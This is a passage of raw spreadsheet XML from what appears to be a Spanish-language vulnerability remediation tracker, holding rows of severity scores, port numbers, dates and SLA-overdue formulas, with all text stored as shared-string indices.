      <c r="A18" s="5">
        <v>17</v>
      </c>
      <c r="B18" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C18" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D18" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E18" s="4" t="s">
        <v>156</v>
      </c>
      <c r="F18" s="4"/>
      <c r="G18" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H18" s="6" t="s">
        <v>157</v>
      </c>
      <c r="I18" s="4" t="s">
        <v>158</v>
      </c>
      <c r="J18" s="4" t="s">
        <v>159</v>
      </c>
      <c r="K18" s="4"/>
      <c r="L18" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M18" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N18" s="7">
        <v>3.5</v>
      </c>
      <c r="O18" s="6"/>
      <c r="P18" s="4" t="s">
        <v>142</v>
      </c>
      <c r="Q18" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R18" s="4"/>
      <c r="S18" s="22"/>
      <c r="T18" s="8">
        <v>43784</v>
      </c>
      <c r="U18" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2425</v>
      </c>
      <c r="V18" s="8">
        <f t="shared" si="1"/>
        <v>43904</v>
      </c>
      <c r="W18" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X18" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y18" s="12" t="s">
        <v>144</v>
      </c>
      <c r="Z18" s="12" t="s">
        <v>145</v>
      </c>
      <c r="AA18" s="8">
        <v>44235</v>
      </c>
      <c r="AB18" s="9" t="s">
        <v>160</v>
      </c>
      <c r="AC18" s="9" t="s">
        <v>161</v>
      </c>
      <c r="AD18" s="32" t="s">
        <v>162</v>
      </c>
      <c r="AE18" s="28">
        <v>44219</v>
      </c>
      <c r="AF18" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG18" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH18" t="str">
        <f>IFERROR(VLOOKUP(H18,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="19" spans="1:34" ht="145" hidden="1" x14ac:dyDescent="0.35">
      <c r="A19" s="5">
        <v>18</v>
      </c>
      <c r="B19" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C19" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D19" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E19" s="4" t="s">
        <v>163</v>
      </c>
      <c r="F19" s="4"/>
      <c r="G19" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H19" s="6" t="s">
        <v>164</v>
      </c>
      <c r="I19" s="4" t="s">
        <v>165</v>
      </c>
      <c r="J19" s="4" t="s">
        <v>166</v>
      </c>
      <c r="K19" s="4"/>
      <c r="L19" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M19" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N19" s="7">
        <v>3.5</v>
      </c>
      <c r="O19" s="6"/>
      <c r="P19" s="4" t="s">
        <v>142</v>
      </c>
      <c r="Q19" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R19" s="4"/>
      <c r="S19" s="22"/>
      <c r="T19" s="8">
        <v>43784</v>
      </c>
      <c r="U19" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2425</v>
      </c>
      <c r="V19" s="8">
        <f t="shared" si="1"/>
        <v>43904</v>
      </c>
      <c r="W19" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X19" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y19" s="12" t="s">
        <v>144</v>
      </c>
      <c r="Z19" s="12" t="s">
        <v>145</v>
      </c>
      <c r="AA19" s="8">
        <v>44089</v>
      </c>
      <c r="AB19" s="9" t="s">
        <v>167</v>
      </c>
      <c r="AC19" s="9" t="s">
        <v>168</v>
      </c>
      <c r="AD19" s="32" t="s">
        <v>169</v>
      </c>
      <c r="AE19" s="29" t="s">
        <v>147</v>
      </c>
      <c r="AF19" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG19" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH19" t="str">
        <f>IFERROR(VLOOKUP(H19,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="20" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A20" s="5">
        <v>19</v>
      </c>
      <c r="B20" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C20" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D20" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E20" s="4" t="s">
        <v>170</v>
      </c>
      <c r="F20" s="4"/>
      <c r="G20" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H20" s="4" t="s">
        <v>172</v>
      </c>
      <c r="I20" s="4" t="s">
        <v>173</v>
      </c>
      <c r="J20" s="4" t="s">
        <v>174</v>
      </c>
      <c r="K20" s="4"/>
      <c r="L20" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M20" s="5" t="s">
        <v>42</v>
      </c>
      <c r="N20" s="7">
        <v>7.6999998092651367</v>
      </c>
      <c r="O20" s="6"/>
      <c r="P20" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q20" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R20" s="4">
        <v>443</v>
      </c>
      <c r="S20" s="22"/>
      <c r="T20" s="8">
        <v>43697</v>
      </c>
      <c r="U20" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2512</v>
      </c>
      <c r="V20" s="8">
        <f t="shared" si="1"/>
        <v>43707</v>
      </c>
      <c r="W20" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X20" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y20" s="30" t="s">
        <v>177</v>
      </c>
      <c r="Z20" s="30" t="s">
        <v>178</v>
      </c>
      <c r="AA20" s="8">
        <v>44117</v>
      </c>
      <c r="AB20" s="9" t="s">
        <v>179</v>
      </c>
      <c r="AC20" s="4" t="s">
        <v>180</v>
      </c>
      <c r="AD20" s="32" t="s">
        <v>181</v>
      </c>
      <c r="AE20" s="8">
        <v>44119</v>
      </c>
      <c r="AF20" s="4" t="s">
        <v>148</v>
      </c>
      <c r="AG20" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH20" t="str">
        <f>IFERROR(VLOOKUP(H20,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="21" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A21" s="5">
        <v>20</v>
      </c>
      <c r="B21" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C21" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D21" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E21" s="4" t="s">
        <v>182</v>
      </c>
      <c r="F21" s="4" t="s">
        <v>183</v>
      </c>
      <c r="G21" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H21" s="4" t="s">
        <v>184</v>
      </c>
      <c r="I21" s="4" t="s">
        <v>185</v>
      </c>
      <c r="J21" s="4" t="s">
        <v>186</v>
      </c>
      <c r="K21" s="4"/>
      <c r="L21" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M21" s="5" t="s">
        <v>42</v>
      </c>
      <c r="N21" s="7">
        <v>7.6999998092651367</v>
      </c>
      <c r="O21" s="6"/>
      <c r="P21" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q21" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R21" s="4">
        <v>443</v>
      </c>
      <c r="S21" s="22"/>
      <c r="T21" s="8">
        <v>43700</v>
      </c>
      <c r="U21" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2509</v>
      </c>
      <c r="V21" s="8">
        <f t="shared" si="1"/>
        <v>43710</v>
      </c>
      <c r="W21" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X21" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y21" s="30" t="s">
        <v>187</v>
      </c>
      <c r="Z21" s="30" t="s">
        <v>188</v>
      </c>
      <c r="AA21" s="13">
        <v>44071</v>
      </c>
      <c r="AB21" s="9" t="s">
        <v>189</v>
      </c>
      <c r="AC21" s="4" t="s">
        <v>190</v>
      </c>
      <c r="AD21" s="32" t="s">
        <v>191</v>
      </c>
      <c r="AE21" s="8">
        <v>44078</v>
      </c>
      <c r="AF21" s="4" t="s">
        <v>148</v>
      </c>
      <c r="AG21" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH21" t="str">
        <f>IFERROR(VLOOKUP(H21,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="22" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A22" s="5">
        <v>21</v>
      </c>
      <c r="B22" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C22" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D22" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E22" s="4"/>
      <c r="F22" s="4"/>
      <c r="G22" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H22" s="4" t="s">
        <v>192</v>
      </c>
      <c r="I22" s="4" t="s">
        <v>193</v>
      </c>
      <c r="J22" s="4" t="s">
        <v>194</v>
      </c>
      <c r="K22" s="4"/>
      <c r="L22" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M22" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N22" s="7">
        <v>5</v>
      </c>
      <c r="O22" s="6"/>
      <c r="P22" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q22" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R22" s="4"/>
      <c r="S22" s="22"/>
      <c r="T22" s="8">
        <v>43784</v>
      </c>
      <c r="U22" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2425</v>
      </c>
      <c r="V22" s="8">
        <f t="shared" si="1"/>
        <v>43874</v>
      </c>
      <c r="W22" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X22" s="12"/>
      <c r="Y22" s="12"/>
      <c r="Z22" s="12"/>
      <c r="AA22" s="8">
        <v>44014</v>
      </c>
      <c r="AB22" s="9" t="s">
        <v>195</v>
      </c>
      <c r="AC22" s="9" t="s">
        <v>196</v>
      </c>
      <c r="AD22" s="32" t="s">
        <v>197</v>
      </c>
      <c r="AE22" s="27">
        <v>44036</v>
      </c>
      <c r="AF22" s="4" t="s">
        <v>148</v>
      </c>
      <c r="AG22" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH22" t="str">
        <f>IFERROR(VLOOKUP(H22,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="23" spans="1:34" ht="51" hidden="1" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A23" s="5">
        <v>22</v>
      </c>
      <c r="B23" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C23" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D23" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E23" s="4" t="s">
        <v>198</v>
      </c>
      <c r="F23" s="4"/>
      <c r="G23" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H23" s="4" t="s">
        <v>199</v>
      </c>
      <c r="I23" s="4" t="s">
        <v>200</v>
      </c>
      <c r="J23" s="4" t="s">
        <v>153</v>
      </c>
      <c r="K23" s="4"/>
      <c r="L23" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M23" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N23" s="7">
        <v>4.3000001907348633</v>
      </c>
      <c r="O23" s="6"/>
      <c r="P23" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q23" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R23" s="4">
        <v>443</v>
      </c>
      <c r="S23" s="22"/>
      <c r="T23" s="8">
        <v>43719</v>
      </c>
      <c r="U23" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2490</v>
      </c>
      <c r="V23" s="8">
        <f t="shared" si="1"/>
        <v>43809</v>
      </c>
      <c r="W23" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X23" s="12"/>
      <c r="Y23" s="12"/>
      <c r="Z23" s="12"/>
      <c r="AA23" s="8">
        <v>43917</v>
      </c>
      <c r="AB23" s="4"/>
      <c r="AC23" s="9" t="s">
        <v>154</v>
      </c>
      <c r="AD23" s="32" t="s">
        <v>155</v>
      </c>
      <c r="AE23" s="9"/>
      <c r="AF23" s="4" t="s">
        <v>201</v>
      </c>
      <c r="AG23" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH23" t="str">
        <f>IFERROR(VLOOKUP(H23,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="24" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A24" s="5">
        <v>23</v>
      </c>
      <c r="B24" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C24" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D24" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E24" s="4" t="s">
        <v>202</v>
      </c>
      <c r="F24" s="4"/>
      <c r="G24" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H24" s="4" t="s">
        <v>203</v>
      </c>
      <c r="I24" s="4" t="s">
        <v>204</v>
      </c>
      <c r="J24" s="4" t="s">
        <v>205</v>
      </c>
      <c r="K24" s="4"/>
      <c r="L24" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M24" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N24" s="7">
        <v>3.5</v>
      </c>
      <c r="O24" s="6"/>
      <c r="P24" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q24" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R24" s="4"/>
      <c r="S24" s="22"/>
      <c r="T24" s="8">
        <v>43784</v>
      </c>
      <c r="U24" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2425</v>
      </c>
      <c r="V24" s="8">
        <f t="shared" si="1"/>
        <v>43904</v>
      </c>
      <c r="W24" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X24" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y24" s="12" t="s">
        <v>206</v>
      </c>
      <c r="Z24" s="12" t="s">
        <v>207</v>
      </c>
      <c r="AA24" s="8">
        <v>44117</v>
      </c>
      <c r="AB24" s="9" t="s">
        <v>208</v>
      </c>
      <c r="AC24" s="14" t="s">
        <v>209</v>
      </c>
      <c r="AD24" s="35" t="s">
        <v>210</v>
      </c>
      <c r="AE24" s="28">
        <v>44148</v>
      </c>
      <c r="AF24" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG24" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH24" t="str">
        <f>IFERROR(VLOOKUP(H24,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="25" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A25" s="5">
        <v>24</v>
      </c>
      <c r="B25" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C25" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D25" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E25" s="4" t="s">
        <v>211</v>
      </c>
      <c r="F25" s="4"/>
      <c r="G25" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H25" s="4" t="s">
        <v>212</v>
      </c>
      <c r="I25" s="4" t="s">
        <v>213</v>
      </c>
      <c r="J25" s="4" t="s">
        <v>214</v>
      </c>
      <c r="K25" s="4"/>
      <c r="L25" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M25" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N25" s="7">
        <v>3.2000000476837158</v>
      </c>
      <c r="O25" s="6"/>
      <c r="P25" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q25" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R25" s="4"/>
      <c r="S25" s="22"/>
      <c r="T25" s="8">
        <v>43609</v>
      </c>
      <c r="U25" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2600</v>
      </c>
      <c r="V25" s="8">
        <f t="shared" si="1"/>
        <v>43729</v>
      </c>
      <c r="W25" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X25" s="12"/>
      <c r="Y25" s="12"/>
      <c r="Z25" s="12"/>
      <c r="AA25" s="8">
        <v>43908</v>
      </c>
      <c r="AB25" s="9" t="s">
        <v>215</v>
      </c>
      <c r="AC25" s="9" t="s">
        <v>216</v>
      </c>
      <c r="AD25" s="32" t="s">
        <v>217</v>
      </c>
      <c r="AE25" s="9"/>
      <c r="AF25" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG25" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH25" t="str">
        <f>IFERROR(VLOOKUP(H25,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="26" spans="1:34" ht="130.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A26" s="5">
        <v>25</v>
      </c>
      <c r="B26" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C26" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D26" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E26" s="4" t="s">
        <v>218</v>
      </c>
      <c r="F26" s="4"/>
      <c r="G26" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H26" s="4" t="s">
        <v>219</v>
      </c>
      <c r="I26" s="4" t="s">
        <v>220</v>
      </c>
      <c r="J26" s="4" t="s">
        <v>221</v>
      </c>
      <c r="K26" s="4"/>
      <c r="L26" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M26" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N26" s="7">
        <v>3.0999999046325684</v>
      </c>
      <c r="O26" s="6"/>
      <c r="P26" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q26" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R26" s="4">
        <v>443</v>
      </c>
      <c r="S26" s="22"/>
      <c r="T26" s="8">
        <v>43719</v>
      </c>
      <c r="U26" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2490</v>
      </c>
      <c r="V26" s="8">
        <f t="shared" si="1"/>
        <v>43839</v>
      </c>
      <c r="W26" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X26" s="12"/>
      <c r="Y26" s="12"/>
      <c r="Z26" s="12"/>
      <c r="AA26" s="13">
        <v>43921</v>
      </c>
      <c r="AB26" s="9" t="s">
        <v>222</v>
      </c>
      <c r="AC26" s="9" t="s">
        <v>223</v>
      </c>
      <c r="AD26" s="32" t="s">
        <v>224</v>
      </c>
      <c r="AE26" s="9"/>
      <c r="AF26" s="4" t="s">
        <v>148</v>
      </c>
      <c r="AG26" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH26" t="str">
        <f>IFERROR(VLOOKUP(H26,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="27" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A27" s="5">
        <v>26</v>
      </c>
      <c r="B27" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C27" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D27" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E27" s="4" t="s">
        <v>226</v>
      </c>
      <c r="F27" s="4"/>
      <c r="G27" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H27" s="4" t="s">
        <v>227</v>
      </c>
      <c r="I27" s="4"/>
      <c r="J27" s="4" t="s">
        <v>228</v>
      </c>
      <c r="K27" s="4"/>
      <c r="L27" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M27" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N27" s="5" t="s">
        <v>229</v>
      </c>
      <c r="O27" s="6"/>
      <c r="P27" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q27" s="6" t="s">
        <v>44</v>
      </c>
      <c r="R27" s="4">
        <v>443</v>
      </c>
      <c r="S27" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T27" s="8">
        <v>43816</v>
      </c>
      <c r="U27" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2393</v>
      </c>
      <c r="V27" s="8">
        <f t="shared" si="1"/>
        <v>43906</v>
      </c>
      <c r="W27" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X27" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y27" s="30" t="s">
        <v>177</v>
      </c>
      <c r="Z27" s="30" t="s">
        <v>177</v>
      </c>
      <c r="AA27" s="8">
        <v>44025</v>
      </c>
      <c r="AB27" s="4"/>
      <c r="AC27" s="9" t="s">
        <v>231</v>
      </c>
      <c r="AD27" s="32" t="s">
        <v>232</v>
      </c>
      <c r="AE27" s="27">
        <v>44012</v>
      </c>
      <c r="AF27" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG27" s="27"/>
      <c r="AH27" t="str">
        <f>IFERROR(VLOOKUP(H27,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="28" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A28" s="5">
        <v>27</v>
      </c>
      <c r="B28" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C28" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D28" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E28" s="4"/>
      <c r="F28" s="4"/>
      <c r="G28" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H28" s="4" t="s">
        <v>233</v>
      </c>
      <c r="I28" s="4"/>
      <c r="J28" s="4" t="s">
        <v>234</v>
      </c>
      <c r="K28" s="4"/>
      <c r="L28" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M28" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N28" s="5" t="s">
        <v>229</v>
      </c>
      <c r="O28" s="6"/>
      <c r="P28" s="10">
        <v>94188208248</v>
      </c>
      <c r="Q28" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R28" s="4">
        <v>443</v>
      </c>
      <c r="S28" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T28" s="8">
        <v>43816</v>
      </c>
      <c r="U28" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2393</v>
      </c>
      <c r="V28" s="8">
        <f t="shared" si="1"/>
        <v>43906</v>
      </c>
      <c r="W28" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X28" s="11"/>
      <c r="Y28" s="11"/>
      <c r="Z28" s="11"/>
      <c r="AA28" s="4"/>
      <c r="AB28" s="9" t="s">
        <v>235</v>
      </c>
      <c r="AC28" s="9" t="s">
        <v>236</v>
      </c>
      <c r="AD28" s="32" t="s">
        <v>237</v>
      </c>
      <c r="AE28" s="9"/>
      <c r="AF28" s="9" t="s">
        <v>201</v>
      </c>
      <c r="AG28" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH28" t="str">
        <f>IFERROR(VLOOKUP(H28,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="29" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A29" s="5">
        <v>28</v>
      </c>
      <c r="B29" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C29" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D29" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E29" s="4"/>
      <c r="F29" s="4"/>
      <c r="G29" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H29" s="4" t="s">
        <v>238</v>
      </c>
      <c r="I29" s="4"/>
      <c r="J29" s="4" t="s">
        <v>239</v>
      </c>
      <c r="K29" s="4"/>
      <c r="L29" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M29" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N29" s="5" t="s">
        <v>229</v>
      </c>
      <c r="O29" s="6"/>
      <c r="P29" s="10">
        <v>94188208248</v>
      </c>
      <c r="Q29" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R29" s="4">
        <v>443</v>
      </c>
      <c r="S29" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T29" s="8">
        <v>43816</v>
      </c>
      <c r="U29" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2393</v>
      </c>
      <c r="V29" s="8">
        <f t="shared" si="1"/>
        <v>43906</v>
      </c>
      <c r="W29" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X29" s="11"/>
      <c r="Y29" s="11"/>
      <c r="Z29" s="11"/>
      <c r="AA29" s="8">
        <v>43934</v>
      </c>
      <c r="AB29" s="4"/>
      <c r="AC29" s="9" t="s">
        <v>240</v>
      </c>
      <c r="AD29" s="32" t="s">
        <v>241</v>
      </c>
      <c r="AE29" s="9"/>
      <c r="AF29" s="4" t="s">
        <v>148</v>
      </c>
      <c r="AG29" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH29" t="str">
        <f>IFERROR(VLOOKUP(H29,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="30" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A30" s="5">
        <v>29</v>
      </c>
      <c r="B30" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C30" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D30" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E30" s="4"/>
      <c r="F30" s="4"/>
      <c r="G30" s="6" t="s">
        <v>244</v>
      </c>
      <c r="H30" s="4"/>
      <c r="I30" s="4"/>
      <c r="J30" s="4" t="s">
        <v>245</v>
      </c>
      <c r="K30" s="4" t="s">
        <v>246</v>
      </c>
      <c r="L30" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M30" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N30" s="5"/>
      <c r="O30" s="6"/>
      <c r="P30" s="4" t="s">
        <v>247</v>
      </c>
      <c r="Q30" s="6"/>
      <c r="R30" s="4">
        <v>443</v>
      </c>
      <c r="S30" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T30" s="8">
        <v>43812</v>
      </c>
      <c r="U30" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V30" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W30" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X30" s="11"/>
      <c r="Y30" s="11"/>
      <c r="Z30" s="11"/>
      <c r="AA30" s="8">
        <v>43969</v>
      </c>
      <c r="AB30" s="9" t="s">
        <v>248</v>
      </c>
      <c r="AC30" s="9" t="s">
        <v>249</v>
      </c>
      <c r="AD30" s="36"/>
      <c r="AE30" s="4"/>
      <c r="AF30" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG30" s="27"/>
      <c r="AH30" t="str">
        <f>IFERROR(VLOOKUP(H30,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="31" spans="1:34" ht="116" hidden="1" x14ac:dyDescent="0.35">
      <c r="A31" s="5">
        <v>30</v>
      </c>
      <c r="B31" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C31" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D31" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E31" s="4"/>
      <c r="F31" s="4"/>
      <c r="G31" s="6" t="s">
        <v>244</v>
      </c>
      <c r="H31" s="4"/>
      <c r="I31" s="4"/>
      <c r="J31" s="4" t="s">
        <v>245</v>
      </c>
      <c r="K31" s="4" t="s">
        <v>246</v>
      </c>
      <c r="L31" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M31" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N31" s="5"/>
      <c r="O31" s="6"/>
      <c r="P31" s="4" t="s">
        <v>250</v>
      </c>
      <c r="Q31" s="6"/>
      <c r="R31" s="4">
        <v>443</v>
      </c>
      <c r="S31" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T31" s="8">
        <v>43812</v>
      </c>
      <c r="U31" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V31" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W31" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X31" s="11"/>
      <c r="Y31" s="11"/>
      <c r="Z31" s="11"/>
      <c r="AA31" s="8">
        <v>43969</v>
      </c>
      <c r="AB31" s="9" t="s">
        <v>251</v>
      </c>
      <c r="AC31" s="9" t="s">
        <v>249</v>
      </c>
      <c r="AD31" s="36"/>
      <c r="AE31" s="4"/>
      <c r="AF31" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG31" s="27"/>
      <c r="AH31" t="str">
        <f>IFERROR(VLOOKUP(H31,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="32" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A32" s="5">
        <v>31</v>
      </c>
